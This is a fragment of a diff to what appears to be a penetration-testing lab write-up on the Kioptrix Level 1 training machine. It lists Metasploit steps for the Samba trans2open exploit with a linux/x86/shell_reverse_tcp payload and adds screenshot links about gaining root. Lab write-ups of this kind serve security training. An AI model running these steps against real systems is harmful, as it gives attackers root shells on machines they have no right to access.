@@ -12,9 +12,12 @@ using arbitraty code -a payload for example- it is possible to obtain root privi
 2) search trans2open
 3) use 1
 4) set RHOSTS <ip_of_kioptrixl1>
-5) set payload linux/shell_reverse_tcp
+5) set payload linux/x86/shell_reverse_tcp
 6) run
 
 ##Supporting Material:
+![samba_trans2open_01.png](./media/samba_trans2open_01.png?raw=true "Gaining root Privilege")
+![samba_trans2open_02.png](./media/samba_trans2open_02.png?raw=true "Directory Listing")
+![samba_trans2open_03.png](./media/samba_trans2open_03.png?raw=true "Accesing to mail server")
 
 ##Impact:
